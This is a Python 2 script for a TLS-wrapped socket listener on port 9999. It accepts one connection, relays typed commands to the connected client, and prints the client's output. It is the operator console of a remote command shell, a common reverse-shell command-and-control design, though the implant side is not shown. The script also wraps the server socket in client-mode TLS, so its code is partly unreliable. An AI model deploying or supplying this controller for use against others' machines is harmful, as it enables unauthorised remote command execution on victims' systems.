from __future__ import print_function
import socket
import sys
import ssl
cmd = ""

def socket_create():
    try:
        global host
        global port
        global s
        host = ''
        port = 9999
        s = socket.socket()
        s = ssl.wrap_socket(s, certfile='ssl.crt', keyfile='ssl.key', ssl_version=ssl.PROTOCOL_TLSv1)
    except socket.error as msg:
        print("Socket creation error: " + str(msg))


# Bind socket to port (the host and port the communication will take place) and wait for connection from client
def socket_bind():
    try:
        global host
        global port
        global s
        print("Binding socket to port: " + str(port))
        s.bind((host, port))
        s.listen(5)
    except socket.error as msg:
        print("Socket binding error: " + str(msg) + "\n" + "Retrying...")
        socket_bind()


# Establish connection with client (socket must be listening for them)
def socket_accept():
    conn, address = s.accept()
    print("Connection has been established | " + "IP " + address[0] + " | Port " + str(address[1]))
    send_commands(conn)
    conn.close()


# Send commands
def send_commands(conn):
    while True:
        cmd = raw_input()
        if cmd == 'quit':
            conn.close()
            s.close()
            sys.exit()
        if len(str.encode(cmd)) > 0:
            conn.send(str.encode(cmd))
            client_response = str(conn.recv(1024))
            print(client_response, end="")


def main():
    socket_create()
    socket_bind()
    socket_accept()


main()
